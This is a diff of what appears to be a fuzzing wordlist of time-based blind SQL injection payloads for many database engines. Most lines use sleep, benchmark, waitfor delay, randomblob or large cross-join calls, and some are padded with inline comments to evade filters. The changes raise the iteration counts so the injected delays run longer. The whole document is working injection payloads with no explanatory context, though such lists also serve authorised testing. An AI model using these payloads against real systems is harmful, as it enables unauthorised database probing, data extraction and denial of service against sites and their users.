 /*any*/aNd/*any*/3065/*any*/BEtwEeN/*any*/DBMS_PIPE/*any*/aNd/*any*/DBMS_PIPE.rEcEiVe_MessagE(cHr(111)||cHr(83)||cHr(81)||cHr(81),20)--/*any*/1337
 /*any*/aNd/*any*/8023/*any*/bETween/*any*/(SeLEcT/*any*/aNd/*any*/(SeLEcT8023/*any*/FRom/*any*/pG_sLeEp(20))--/*any*/1337
-/*azx*//*azx*/or/*azx*/benchmark(10000000,MD5(1))--/*azx*/-
+/*azx*//*azx*/or/*azx*/benchmark(20000000,MD5(1))--/*azx*/-
 /*azx*//*azx*/or/*azx*/pg_sleep(5)#/*azx*/xx
-/*azx*/or/*azx*/benchmark(10000000,MD5(1))#
+/*azx*/or/*azx*/benchmark(20000000,MD5(1))#
 /*azx*/or/*azx*/pg_sleep(5)--
 /*azx*/waitfor/*azx*/delay/*azx*/'0:0:5'/*azx*/--
 /*azx*/waitfor/*azx*/delay/*azx*/'0:0:5'/*azx*//*/*azx*/
 1 or (select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)=0 or 1=1
 1/*azx*/or/*azx*/(select/*azx*/count(*)/*azx*/from/*azx*/INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys1,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys2,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys3,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys4,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys5,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys6)=0/*azx*/or/*azx*/1=1
 9999" or (select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)=0 or "0"="9999
-9999" or benchmark(15000000,md5(0x4e446b6e)) or "0"="9999
+9999" or benchmark(20000000,md5(0x4e446b6e)) or "0"="9999
 9999"+(select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)+"9999
 9999"+(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)+"9999
 9999"+(select/*azx*/count(*)/*azx*/from/*azx*/INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys1,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys2,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys3,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys4,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys5,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys6)+"9999
 9999"+(select/*azx*/count(*)/*azx*/from/*azx*/sysusers/*azx*/as/*azx*/sys1,sysusers/*azx*/as/*azx*/sys2,sysusers/*azx*/as/*azx*/sys3,sysusers/*azx*/as/*azx*/sys4,sysusers/*azx*/as/*azx*/sys5,sysusers/*azx*/as/*azx*/sys6,sysusers/*azx*/as/*azx*/sys7)+"9999
 9999"/*azx*/or/*azx*/(select/*azx*/count(*)/*azx*/from/*azx*/INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys1,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys2,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys3,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys4,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys5,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys6)=0/*azx*/or/*azx*/"0"="9999
-9999"/*azx*/or/*azx*/benchmark(15000000,md5(0x4e446b6e))/*azx*/or/*azx*/"0"="9999
+9999"/*azx*/or/*azx*/benchmark(20000000,md5(0x4e446b6e))/*azx*/or/*azx*/"0"="9999
 9999"||(select 99999999 from pg_sleep(15))||"9999
 9999"||(select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)||"9999
 9999"||(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)||"9999
 9999"||(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)||"9999
 9999"||(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3)||"9999
 9999"||(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)||"9999
-9999"||(select like('abcdefg',upper(hex(randomblob(150000000)))))||"9999
+9999"||(select like('abcdefg',upper(hex(randomblob(200000000)))))||"9999
 9999"||(select/*azx*/99999999/*azx*/from/*azx*/pg_sleep(15))||"9999
 9999"||(select/*azx*/count(*)/*azx*/from/*azx*/INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys1,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys2,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys3,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys4,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys5,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys6)||"9999
 9999"||(select/*azx*/count(*)/*azx*/from/*azx*/all_users/*azx*/t1,all_users/*azx*/t2,all_users/*azx*/t3,all_users/*azx*/t4,all_users/*azx*/t5)||"9999
 9999"||(select/*azx*/count(*)/*azx*/from/*azx*/domain.domains/*azx*/as/*azx*/t1,domain.columns/*azx*/as/*azx*/t2,domain.tables/*azx*/as/*azx*/t3)||"9999
 9999"||(select/*azx*/count(*)/*azx*/from/*azx*/rdb$fields/*azx*/as/*azx*/t1,rdb$types/*azx*/as/*azx*/t2,rdb$collations/*azx*/as/*azx*/t3)||"9999
 9999"||(select/*azx*/count(*)/*azx*/from/*azx*/sysibm.systables/*azx*/as/*azx*/t1,sysibm.systables/*azx*/as/*azx*/t2,sysibm.systables/*azx*/as/*azx*/t3)||"9999
-9999"||(select/*azx*/like('abcdefg',upper(hex(randomblob(150000000)))))||"9999
+9999"||(select/*azx*/like('abcdefg',upper(hex(randomblob(200000000)))))||"9999
 9999' or (select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)=0 or '0'='9999
-9999' or benchmark(15000000,md5(0x4e446b6e)) or '0'='9999
+9999' or benchmark(20000000,md5(0x4e446b6e)) or '0'='9999
 9999' || (select 99999999 from pg_sleep(15))||'9999
 9999'+(select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)+'9999
 9999'+(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)+'9999
 9999'+(select/*azx*/count(*)/*azx*/from/*azx*/INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys1,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys2,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys3,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys4,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys5,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys6)+'9999
 9999'+(select/*azx*/count(*)/*azx*/from/*azx*/sysusers/*azx*/as/*azx*/sys1,sysusers/*azx*/as/*azx*/sys2,sysusers/*azx*/as/*azx*/sys3,sysusers/*azx*/as/*azx*/sys4,sysusers/*azx*/as/*azx*/sys5,sysusers/*azx*/as/*azx*/sys6,sysusers/*azx*/as/*azx*/sys7)+'9999
 9999'/*azx*/or/*azx*/(select/*azx*/count(*)/*azx*/from/*azx*/INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys1,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys2,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys3,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys4,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys5,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys6)=0/*azx*/or/*azx*/'0'='9999
-9999'/*azx*/or/*azx*/benchmark(15000000,md5(0x4e446b6e))/*azx*/or/*azx*/'0'='9999
+9999'/*azx*/or/*azx*/benchmark(20000000,md5(0x4e446b6e))/*azx*/or/*azx*/'0'='9999
 9999'/*azx*/||/*azx*/(select/*azx*/99999999/*azx*/from/*azx*/pg_sleep(15))||'9999
 9999'||(select 99999999 from pg_sleep(15))||'9999
 9999'||(select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)||'9999
@@ -636,28 +636,28 @@
 9999'||(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)||'9999
 9999'||(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3)||'9999
 9999'||(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)||'9999
-9999'||(select like('abcdefg',upper(hex(randomblob(150000000)))))||'9999
+9999'||(select like('abcdefg',upper(hex(randomblob(200000000)))))||'9999
 9999'||(select/*azx*/99999999/*azx*/from/*azx*/pg_sleep(15))||'9999
 9999'||(select/*azx*/count(*)/*azx*/from/*azx*/INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys1,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys2,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys3,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys4,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys5,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys6)||'9999
 9999'||(select/*azx*/count(*)/*azx*/from/*azx*/all_users/*azx*/t1,all_users/*azx*/t2,all_users/*azx*/t3,all_users/*azx*/t4,all_users/*azx*/t5)||'9999
 9999'||(select/*azx*/count(*)/*azx*/from/*azx*/domain.domains/*azx*/as/*azx*/t1,domain.columns/*azx*/as/*azx*/t2,domain.tables/*azx*/as/*azx*/t3)||'9999
 9999'||(select/*azx*/count(*)/*azx*/from/*azx*/rdb$fields/*azx*/as/*azx*/t1,rdb$types/*azx*/as/*azx*/t2,rdb$collations/*azx*/as/*azx*/t3)||'9999
 9999'||(select/*azx*/count(*)/*azx*/from/*azx*/sysibm.systables/*azx*/as/*azx*/t1,sysibm.systables/*azx*/as/*azx*/t2,sysibm.systables/*azx*/as/*azx*/t3)||'9999
-9999'||(select/*azx*/like('abcdefg',upper(hex(randomblob(150000000)))))||'9999
+9999'||(select/*azx*/like('abcdefg',upper(hex(randomblob(200000000)))))||'9999
 99999999 or (select count (*) from INFORMATION_SCHEMA.tables as sys1,INFROMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)=0
 99999999 or (select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)=0
 99999999" or (select count (*) from INFORMATION_SCHEMA.tables as sys1,INFROMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)=0 or "0"="99999999
 99999999" or (select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)=0 or "0"="99999999
-99999999" or benchmark(15000000,md5(0x4e446b6e)) or "0"="99999999
-99999999" or benmark(150000000,md5(0x4e446b6e)) or "0"="99999999
-99999999" ||(select like('abcdefg',upper(hex(randomblob(150000000)))))||"99999999
+99999999" or benchmark(20000000,md5(0x4e446b6e)) or "0"="99999999
+99999999" or benmark(200000000,md5(0x4e446b6e)) or "0"="99999999
+99999999" ||(select like('abcdefg',upper(hex(randomblob(200000000)))))||"99999999
 99999999"+(select count (*) from INFORMATION_SCHEMA.tables as sys1,INFROMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)+"99999999
 99999999"+(select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)+"99999999
 99999999"+(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)+"99999999
 99999999"+(select/*azx*/count(*)/*azx*/from/*azx*/INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys1,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys2,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys3,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys4,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys5,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys6)+"99999999
 99999999"+(select/*azx*/count(*)/*azx*/from/*azx*/sysusers/*azx*/as/*azx*/sys1,sysusers/*azx*/as/*azx*/sys2,sysusers/*azx*/as/*azx*/sys3,sysusers/*azx*/as/*azx*/sys4,sysusers/*azx*/as/*azx*/sys5,sysusers/*azx*/as/*azx*/sys6,sysusers/*azx*/as/*azx*/sys7)+"99999999
 99999999"/*azx*/or/*azx*/(select/*azx*/count(*)/*azx*/from/*azx*/INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys1,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys2,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys3,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys4,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys5,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys6)=0/*azx*/or/*azx*/"0"="99999999
-99999999"/*azx*/or/*azx*/benchmark(15000000,md5(0x4e446b6e))/*azx*/or/*azx*/"0"="99999999
+99999999"/*azx*/or/*azx*/benchmark(20000000,md5(0x4e446b6e))/*azx*/or/*azx*/"0"="99999999
 99999999"||(select 9999999999999999 from pg_sleep(10))||"99999999
 99999999"||(select 99999999999999999 from pg_sleep(15))||"99999999
 99999999"||(select count (*) from INFORMATION_SCHEMA.tables as sys1,INFROMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)||"99999999
@@ -666,26 +666,26 @@
 99999999"||(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)||"99999999
 99999999"||(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3)||"99999999
 99999999"||(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)||"99999999
-99999999"||(select like('abcdefg',upper(hex(randomblob(150000000)))))||"99999999
+99999999"||(select like('abcdefg',upper(hex(randomblob(200000000)))))||"99999999
 99999999"||(select/*azx*/9999999999999999/*azx*/from/*azx*/pg_sleep(10))||"99999999
 99999999"||(select/*azx*/count(*)/*azx*/from/*azx*/INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys1,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys2,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys3,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys4,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys5,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys6)||"99999999
 99999999"||(select/*azx*/count(*)/*azx*/from/*azx*/all_users/*azx*/t1,all_users/*azx*/t2,all_users/*azx*/t3,all_users/*azx*/t4,all_users/*azx*/t5)||"99999999
 99999999"||(select/*azx*/count(*)/*azx*/from/*azx*/domain.domains/*azx*/as/*azx*/t1,domain.columns/*azx*/as/*azx*/t2,domain.tables/*azx*/as/*azx*/t3)||"99999999
 99999999"||(select/*azx*/count(*)/*azx*/from/*azx*/rdb$fields/*azx*/as/*azx*/t1,rdb$types/*azx*/as/*azx*/t2,rdb$collations/*azx*/as/*azx*/t3)||"99999999
 99999999"||(select/*azx*/count(*)/*azx*/from/*azx*/sysibm.systables/*azx*/as/*azx*/t1,sysibm.systables/*azx*/as/*azx*/t2,sysibm.systables/*azx*/as/*azx*/t3)||"99999999
-99999999"||(select/*azx*/like('abcdefg',upper(hex(randomblob(150000000)))))||"99999999
+99999999"||(select/*azx*/like('abcdefg',upper(hex(randomblob(200000000)))))||"99999999
 99999999' or (select count (*) from INFORMATION_SCHEMA.tables as sys1,INFROMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)=0 or '0'='99999999
 99999999' or (select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)=0 or '0'='99999999
-99999999' or benchmark(15000000,md5(0x4e446b6e)) or '0'='99999999
-99999999' or benmark(150000000,md5(0x4e446b6e)) or '0'='99999999
-99999999' ||(select like('abcdefg',upper(hex(randomblob(150000000)))))||'99999999
+99999999' or benchmark(20000000,md5(0x4e446b6e)) or '0'='99999999
+99999999' or benmark(200000000,md5(0x4e446b6e)) or '0'='99999999
+99999999' ||(select like('abcdefg',upper(hex(randomblob(200000000)))))||'99999999
 99999999'+(select count (*) from INFORMATION_SCHEMA.tables as sys1,INFROMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)+'99999999
 99999999'+(select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)+'99999999
 99999999'+(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)+'99999999
 99999999'+(select/*azx*/count(*)/*azx*/from/*azx*/INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys1,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys2,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys3,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys4,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys5,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys6)+'99999999
 99999999'+(select/*azx*/count(*)/*azx*/from/*azx*/sysusers/*azx*/as/*azx*/sys1,sysusers/*azx*/as/*azx*/sys2,sysusers/*azx*/as/*azx*/sys3,sysusers/*azx*/as/*azx*/sys4,sysusers/*azx*/as/*azx*/sys5,sysusers/*azx*/as/*azx*/sys6,sysusers/*azx*/as/*azx*/sys7)+'99999999
 99999999'/*azx*/or/*azx*/(select/*azx*/count(*)/*azx*/from/*azx*/INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys1,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys2,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys3,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys4,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys5,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys6)=0/*azx*/or/*azx*/'0'='99999999
-99999999'/*azx*/or/*azx*/benchmark(15000000,md5(0x4e446b6e))/*azx*/or/*azx*/'0'='99999999
+99999999'/*azx*/or/*azx*/benchmark(20000000,md5(0x4e446b6e))/*azx*/or/*azx*/'0'='99999999
 99999999'||(select 9999999999999999 from pg_sleep(10))||'99999999
 99999999'||(select 99999999999999999 from pg_sleep(15))||'99999999
 99999999'||(select count (*) from INFORMATION_SCHEMA.tables as sys1,INFROMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)||'99999999
@@ -694,58 +694,58 @@
 99999999'||(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)||'99999999
 99999999'||(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3)||'99999999
 99999999'||(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)||'99999999
-99999999'||(select like('abcdefg',upper(hex(randomblob(150000000)))))||'99999999
+99999999'||(select like('abcdefg',upper(hex(randomblob(200000000)))))||'99999999
 99999999'||(select/*azx*/9999999999999999/*azx*/from/*azx*/pg_sleep(10))||'99999999
 99999999'||(select/*azx*/count(*)/*azx*/from/*azx*/INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys1,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys2,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys3,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys4,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys5,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys6)||'99999999
 99999999'||(select/*azx*/count(*)/*azx*/from/*azx*/all_users/*azx*/t1,all_users/*azx*/t2,all_users/*azx*/t3,all_users/*azx*/t4,all_users/*azx*/t5)||'99999999
 99999999'||(select/*azx*/count(*)/*azx*/from/*azx*/domain.domains/*azx*/as/*azx*/t1,domain.columns/*azx*/as/*azx*/t2,domain.tables/*azx*/as/*azx*/t3)||'99999999
 99999999'||(select/*azx*/count(*)/*azx*/from/*azx*/rdb$fields/*azx*/as/*azx*/t1,rdb$types/*azx*/as/*azx*/t2,rdb$collations/*azx*/as/*azx*/t3)||'99999999
 99999999'||(select/*azx*/count(*)/*azx*/from/*azx*/sysibm.systables/*azx*/as/*azx*/t1,sysibm.systables/*azx*/as/*azx*/t2,sysibm.systables/*azx*/as/*azx*/t3)||'99999999
-99999999'||(select/*azx*/like('abcdefg',upper(hex(randomblob(150000000)))))||'99999999
+99999999'||(select/*azx*/like('abcdefg',upper(hex(randomblob(200000000)))))||'99999999
 99999999/*azx*/or/*azx*/(select/*azx*/count(*)/*azx*/from/*azx*/INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys1,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys2,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys3,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys4,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys5,INFORMATION_SCHEMA.tables/*azx*/as/*azx*/sys6)=0
 ;waitfor delay '0:0:5'-- -
 ;waitfor/*azx*/delay/*azx*/'0:0:5'--/*azx*/-
-AND 'xxqwx'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),600000000),NULL)-- 923ur
-AND 'xxqwx'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),6000000000),NULL)-- fjdhfj
+AND 'xxqwx'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),2000000000),NULL)-- 923ur
+AND 'xxqwx'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),20000000000),NULL)-- fjdhfj
 AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
 AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
 AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
 AND (SELECT 5 FROM (SELECT(SLEEP(6)))xxqwx)-- -
-AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(2000000000/2))))
 AND 5=(SELECT 5 FROM PG_SLEEP(6))
 AND 5=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)
-AND 5=(SELECT COUNT(*) FROM GENERATE_SERIES(1,6000000))-- -
+AND 5=(SELECT COUNT(*) FROM GENERATE_SERIES(1,20000000))-- -
 AND 5=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)
 AND 5=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)
 AND 5=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
 AND 5=DBMS_PIPE.RECEIVE_MESSAGE('xxqwx',6)
-AND 5=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(600000000/2))))
-AND 5=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(600000000/2))))-- -
+AND 5=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(2000000000/2))))
+AND 5=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(2000000000/2))))-- -
 AND ELT(5=5,SLEEP(6))
 AND SLEEP(6)
 AND SLEEP(6)-- xvfdf
-AND benchmark(50000000,MD5(1))
+AND benchmark(20000000,MD5(1))
 AND pg_SLEEP(5)-- c
-AND/*azx*/'xxqwx'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),600000000),NULL)--/*azx*/923ur
-AND/*azx*/'xxqwx'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),6000000000),NULL)--/*azx*/fjdhfj
+AND/*azx*/'xxqwx'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),2000000000),NULL)--/*azx*/923ur
+AND/*azx*/'xxqwx'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),20000000000),NULL)--/*azx*/fjdhfj
 AND/*azx*/(SELECT/*azx*/*/*azx*/FROM/*azx*/(SELECT(SLEEP(5)))YjoC)/*azx*/AND/*azx*/'%'='
 AND/*azx*/(SELECT/*azx*/*/*azx*/FROM/*azx*/(SELECT(SLEEP(5)))nQIP)
 AND/*azx*/(SELECT/*azx*/*/*azx*/FROM/*azx*/(SELECT(SLEEP(5)))nQIP)#
 AND/*azx*/(SELECT/*azx*/5/*azx*/FROM/*azx*/(SELECT(SLEEP(6)))xxqwx)--/*azx*/-
-AND/*azx*/2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+AND/*azx*/2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(2000000000/2))))
 AND/*azx*/5=(SELECT/*azx*/5/*azx*/FROM/*azx*/PG_SLEEP(6))
 AND/*azx*/5=(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/DOMAIN.DOMAINS/*azx*/AS/*azx*/T1,DOMAIN.COLUMNS/*azx*/AS/*azx*/T2,DOMAIN.TABLES/*azx*/AS/*azx*/T3)
-AND/*azx*/5=(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/GENERATE_SERIES(1,6000000))--/*azx*/-
+AND/*azx*/5=(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/GENERATE_SERIES(1,20000000))--/*azx*/-
 AND/*azx*/5=(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/RDB$FIELDS/*azx*/AS/*azx*/T1,RDB$TYPES/*azx*/AS/*azx*/T2,RDB$COLLATIONS/*azx*/AS/*azx*/T3,RDB$FUNCTIONS/*azx*/AS/*azx*/T4)
 AND/*azx*/5=(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/SYSMASTER:SYSPAGHDR)
 AND/*azx*/5=(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/sysusers/*azx*/AS/*azx*/sys1,sysusers/*azx*/AS/*azx*/sys2,sysusers/*azx*/AS/*azx*/sys3,sysusers/*azx*/AS/*azx*/sys4,sysusers/*azx*/AS/*azx*/sys5,sysusers/*azx*/AS/*azx*/sys6,sysusers/*azx*/AS/*azx*/sys7)
 AND/*azx*/5=DBMS_PIPE.RECEIVE_MESSAGE('xxqwx',6)
